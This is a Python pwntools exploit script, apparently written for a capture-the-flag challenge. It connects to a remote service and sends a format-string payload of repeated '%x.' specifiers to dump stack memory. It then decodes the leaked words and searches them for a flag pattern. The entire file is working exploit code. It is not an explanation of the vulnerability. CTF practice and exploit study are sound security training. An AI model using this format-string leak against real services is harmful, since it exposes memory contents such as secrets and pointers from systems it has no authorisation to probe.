from pwn import *

host = "10.213.0.102"
port = "46213"
context.log_level = 'info'
context.arch = 'i386'

p = remote(host, port)
p.recvuntil(b"> ")

print("[*] Dumping stack memory as hex to find flag between {...}")
print("[*] Looking for pattern matching CTF{...} or similar\n")

# Dump a large portion of the stack
payload = b"%x." * 60
p.sendline(payload)
response = p.recvuntil(b"> ")

# Parse hex values
hex_values = response.split(b'.>')[0].split(b'.')
flag_candidates = []

print("Stack dump (decoded from little-endian):")
print("=" * 60)

for i, val in enumerate(hex_values):
    try:
        if val and val.strip():
            hex_str = val.decode().strip()
            
            # Skip invalid hex
            if not all(c in '0123456789abcdefABCDEF' for c in hex_str):
                continue
                
            # Pad to 8 chars (4 bytes)
            hex_str = hex_str.zfill(8)
            
            # Convert from little-endian
            bytes_val = bytes.fromhex(hex_str)[::-1]
            ascii_str = bytes_val.decode(errors='ignore')
            
            # Print if it contains printable characters
            if any(c.isprintable() and c not in '\x00\n\r\t' for c in ascii_str):
                print(f"[{i:2d}] 0x{hex_str} -> {repr(ascii_str)}")
                flag_candidates.append(ascii_str)
                
                # Check for flag markers
                if '{' in ascii_str or '}' in ascii_str or 'CTF' in ascii_str:
                    print(f"     ^^^ POTENTIAL FLAG PART!")
                    
    except Exception as e:
        pass

print("\n" + "=" * 60)
print("[*] Concatenated readable strings:")
full_string = ''.join(flag_candidates)
print(full_string)

# Try to extract flag pattern
import re
flag_match = re.search(r'[A-Za-z0-9_]+\{[^}]+\}', full_string)
if flag_match:
    print(f"\n[!] FOUND FLAG: {flag_match.group()}")
else:
    print("\n[*] No clear flag pattern found in concatenated string")
    print("[*] Manual inspection may be needed")

p.close()